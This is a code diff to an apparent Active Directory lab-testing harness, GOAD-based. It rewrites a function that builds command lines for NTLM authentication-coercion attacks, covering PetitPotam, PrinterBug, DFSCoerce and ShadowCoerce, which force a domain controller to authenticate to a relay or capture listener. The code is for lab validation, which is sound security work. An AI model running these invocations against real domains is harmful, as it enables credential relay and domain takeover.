@@ -34,8 +34,8 @@ Scoring identity (ad-lab-harness ``truth/GOAD-proof.json``): COERCION keys on
 UNVERIFIED ASSUMPTIONS (pin in-lab, mirroring laps.py / adcs_esc1.py):
 * the capture-listener invocation (``impacket-ntlmrelayx -smb2support -socks`` as
   a capture-only listener binding the local interface);
-* the coercion-trigger invocations (``Coercer coerce`` / ``PetitPotam.py`` /
-  ``printerbug.py`` / ``dfscoerce.py``);
+* the coercer-backed coercion-trigger invocations (``coercer coerce``, with
+  single-vector method filters or the unfiltered multiplexer);
 * the captured-auth marker (an ``Authenticating``/``received connection`` line
   naming the ``<DC>$`` machine account). If the real wording differs the chain
   gets no positive predicate and honestly reports not-proved/inconclusive.
@@ -98,9 +98,8 @@ def coercion_trigger_argv(method: str, victim_dc: str, listener_host: str,
                           cfg) -> list[str]:
     """Build a coercion-trigger argv for ``method`` (UNVERIFIED invocations).
 
-    ``auto`` uses the Coercer multiplexer (its own petitpotam->printerbug->
-    dfscoerce fallback); the named methods call the single-vector tools. Secrets
-    ride ``-p``/``-hashes`` (or an impacket ``domain/user:pass@host`` target) so
+    ``auto`` uses the Coercer multiplexer; named methods filter that same
+    installed tool to a single vector. Secrets ride ``-p``/``-hashes`` so
     :func:`redact_argv` masks them in any stored argv.
     """
     user = cfg.username or ""
@@ -110,31 +109,19 @@ def coercion_trigger_argv(method: str, victim_dc: str, listener_host: str,
         secret = ["-hashes", cfg.nt_hash]
     elif cfg.password is not None:
         secret = ["-p", cfg.password]
-    if method == "printerbug":
-        # printerbug.py takes an impacket target + the listener to call back to.
-        tgt = f"{domain}/{user}"
-        if cfg.password is not None:
-            tgt += f":{cfg.password}"
-        return ["printerbug.py", f"{tgt}@{victim_dc}", listener_host]
-    if method == "petitpotam":
-        return ["PetitPotam.py", "-u", user, "-d", domain, *secret,
-                listener_host, victim_dc]
-    if method == "dfscoerce":
-        return ["dfscoerce.py", "-u", user, "-d", domain, *secret,
-                listener_host, victim_dc]
-    if method == "shadowcoerce":
-        # ShadowCoerce = MS-FSRVP. Coercer has no `-m fsrvp`; filter to that protocol
-        # (``--filter-protocol-name MS-FSRVP`` -- confirmed flag). FSRVP is frequently
-        # disabled/patched, so this is an UNVERIFIED vector like the others. (WebDAV
-        # coercion is a listener FORMAT, not a method: pass ``<host>@80/<path>`` as the
-        # listener to petitpotam/dfscoerce.)
-        return ["coercer", "coerce", "-u", user, "-d", domain, *secret,
-                "-t", victim_dc, "-l", listener_host,
-                "--filter-protocol-name", "MS-FSRVP"]
-    # auto -> coercer multiplexer (scan then coerce every reachable method).
-    # Binary is lowercase 'coercer' (the Coercer entry point on Kali/kali-vr).
-    return ["coercer", "coerce", "-u", user, "-d", domain, *secret,
-            "-t", victim_dc, "-l", listener_host]
+    # Replace the standalone PetitPotam/printerbug/dfscoerce scripts with the
+    # installed coercer entry point; ShadowCoerce uses its MS-FSRVP method.
+    vectors = {
+        "petitpotam": "EfsRpcOpenFileRaw",
+        "printerbug": "RpcRemoteFindFirstPrinterChangeNotification",
+        "dfscoerce": "NetrDfsRemoveStdRoot",
+        "shadowcoerce": "IsPathShadowCopied",
+    }
+    argv = ["coercer", "coerce", "-u", user, "-d", domain, *secret,
+            "--dc-ip", cfg.dc_ip, "-l", listener_host, "-t", victim_dc]
+    if method in vectors:
+        argv += ["--filter-method-name", vectors[method]]
+    return [*argv, "--always-continue"]
 
 
 class CoercionExecutor(ValidationExecutor):
